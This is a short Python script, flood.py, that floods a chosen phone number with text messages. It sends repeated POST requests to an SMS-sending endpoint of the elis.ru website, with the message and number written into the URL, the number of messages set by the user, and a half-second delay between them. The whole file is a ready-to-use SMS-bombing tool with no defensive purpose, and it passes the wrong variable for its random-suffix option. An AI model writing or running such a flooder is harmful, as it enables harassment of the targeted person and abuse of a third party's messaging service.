#!/usr/bin/python3

import requests
from random import random
from sys import argv, exit
from time import sleep


def main():
    randoms = False

    try:
        phone = argv[1]
        count = int(argv[2])

        if len(argv) == 4:
            randoms = True

        text = input("text: ")

    except:
        print("use: ./flood.py [phone] [count] [random]")
        exit()

    for i in range(0, count):
        flood(phone, text, random)
        sleep(0.5)


def flood(phone, text, randoms):
    if randoms:
        text += "\n\n" + str(random())
    url = f"https://elis.ru/api/sms/sendSms/{text}/{phone}/"

    response = requests.post(url=url, headers={"X-Requested-With": "XMLHttpRequest"})
    print(response.content.decode())


if __name__ == "__main__":
    main()
